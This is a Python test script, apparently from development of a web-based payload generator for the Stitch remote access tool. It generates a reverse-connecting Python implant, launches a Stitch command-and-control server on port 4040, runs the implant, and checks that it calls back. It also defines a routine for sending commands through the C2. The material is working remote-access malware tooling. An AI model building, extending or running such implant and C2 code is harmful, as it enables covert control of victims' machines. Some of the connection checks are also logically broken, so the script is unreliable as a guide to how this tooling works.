#!/usr/bin/env python3
"""
Test actual payload execution and C2 connectivity
This will generate a payload, execute it, and verify it connects
"""

import os
import sys
import time
import subprocess
import socket
import json
import threading

sys.path.insert(0, '/workspace')
os.environ['PATH'] = os.environ.get('PATH', '') + ':/home/ubuntu/.local/bin'

def generate_test_payload():
    """Generate a test payload that connects to localhost"""
    print("[*] Generating test payload...")
    
    from web_payload_generator import web_payload_gen
    
    # Generate a payload that connects back to localhost
    config = {
        'bind_host': '',
        'bind_port': '',
        'listen_host': '127.0.0.1',  # Connect to localhost
        'listen_port': '4040',        # Default Stitch port
        'enable_bind': False,
        'enable_listen': True,
        'platform': 'python'  # Use Python for easier debugging
    }
    
    result = web_payload_gen.generate_payload(config)
    
    if result['success']:
        print(f"[+] Payload generated: {result['payload_path']}")
        return result['payload_path']
    else:
        print(f"[-] Failed to generate payload: {result['message']}")
        return None

def start_stitch_server():
    """Start the Stitch C2 server"""
    print("[*] Starting Stitch C2 server...")
    
    # Create a Python script that will run the server
    server_script = """
import sys
import os
sys.path.insert(0, '/workspace')
os.chdir('/workspace')

from Application.stitch_cmd import stitch_server

# Create server instance
server = stitch_server()

# Start listening on port 4040
print("[+] Starting server on port 4040...")
server.do_listen('4040')

# Keep running
import time
while True:
    time.sleep(1)
    # Check for connections
    if server.inf_sock:
        print(f"[+] Active connections: {list(server.inf_sock.keys())}")
"""
    
    with open('/tmp/run_server.py', 'w') as f:
        f.write(server_script)
    
    # Start server process
    proc = subprocess.Popen(
        ['python3', '/tmp/run_server.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for server to start
    time.sleep(3)
    
    # Check if port is open
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', 4040))
    sock.close()
    
    if result == 0:
        print("[+] Server listening on port 4040")
        return proc
    else:
        print("[-] Server failed to start")
        proc.terminate()
        return None

def execute_payload(payload_path):
    """Execute the generated payload"""
    print(f"[*] Executing payload: {payload_path}")
    
    # Read payload to check type
    with open(payload_path, 'rb') as f:
        header = f.read(100)
    
    if b'python' in header.lower() or b'#!/' in header:
        # Python script
        print("[*] Executing as Python script...")
        
        # Execute in background
        proc = subprocess.Popen(
            ['python3', payload_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    else:
        # Binary
        print("[*] Executing as binary...")
        os.chmod(payload_path, 0o755)
        proc = subprocess.Popen(
            [payload_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    
    # Give it time to connect
    time.sleep(2)
    
    # Check if still running
    if proc.poll() is None:
        print(f"[+] Payload running (PID: {proc.pid})")
        return proc
    else:
        stdout, stderr = proc.communicate()
        print(f"[-] Payload exited immediately")
        if stdout:
            print(f"  stdout: {stdout.decode()[:500]}")
        if stderr:
            print(f"  stderr: {stderr.decode()[:500]}")
        return None

def check_connection():
    """Check if payload connected to C2"""
    print("[*] Checking for C2 connection...")
    
    # Import stitch server to check connections
    from Application.stitch_cmd import stitch_server
    
    # Create a server instance to check connections
    test_server = stitch_server()
    
    # Check if there are active connections
    if test_server.inf_sock:
        print(f"[+] Found {len(test_server.inf_sock)} connection(s):")
        for ip in test_server.inf_sock.keys():
            print(f"    - {ip}")
        return True
    else:
        print("[-] No connections found")
        return False

def test_payload_commands(server_proc):
    """Test executing commands through the payload"""
    print("\n[*] Testing command execution...")
    
    # Send commands through server stdin
    test_commands = [
        "sessions",
        "help",
        "pwd"
    ]
    
    for cmd in test_commands:
        print(f"  Sending: {cmd}")
        server_proc.stdin.write(cmd + "\n")
        server_proc.stdin.flush()
        time.sleep(1)
    
    return True

def main():
    print("="*70)
    print("PAYLOAD EXECUTION TEST")
    print("="*70)
    
    server_proc = None
    payload_proc = None
    
    try:
        # Generate payload
        payload_path = generate_test_payload()
        if not payload_path:
            print("[-] Failed to generate payload")
            return False
        
        # Start server
        server_proc = start_stitch_server()
        if not server_proc:
            print("[-] Failed to start server")
            return False
        
        # Execute payload
        payload_proc = execute_payload(payload_path)
        if not payload_proc:
            print("[-] Failed to execute payload")
            return False
        
        # Wait for connection
        time.sleep(3)
        
        # Check connection
        connected = check_connection()
        
        if connected:
            print("\n" + "="*70)
            print("[+] SUCCESS - Payload connected to C2!")
            print("="*70)
            return True
        else:
            print("\n[-] Payload did not connect")
            return False
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    finally:
        # Cleanup
        print("\n[*] Cleaning up...")
        if payload_proc:
            payload_proc.terminate()
            try:
                payload_proc.wait(timeout=2)
            except:
                payload_proc.kill()
        
        if server_proc:
            server_proc.terminate()
            try:
                server_proc.wait(timeout=2)
            except:
                server_proc.kill()
        
        print("[+] Cleanup complete")

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)